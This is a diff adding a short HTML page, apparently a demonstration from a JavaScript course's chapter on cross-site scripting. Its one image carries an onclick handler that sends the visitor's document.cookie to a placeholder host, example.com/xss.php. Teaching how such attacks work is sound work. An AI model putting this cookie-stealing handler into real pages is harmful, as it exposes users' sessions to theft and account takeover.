@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Document</title>
+  </head>
+  <body>
+    <img
+      alt="This is image"
+      width="400"
+      height="300"
+      style="cursor: pointer"
+      onclick="window.location.replace(`http://example.com/xss.php?cookies=${encodeURIComponent(document.cookie)}`)"
+      src="https://minio.rocketdev.dev/blog/courses/javascript_ninja/ch_05/cross_site_scripting_xss/xss.png"
+      crossorigin="anonymous"
+    />
+  </body>
+</html>
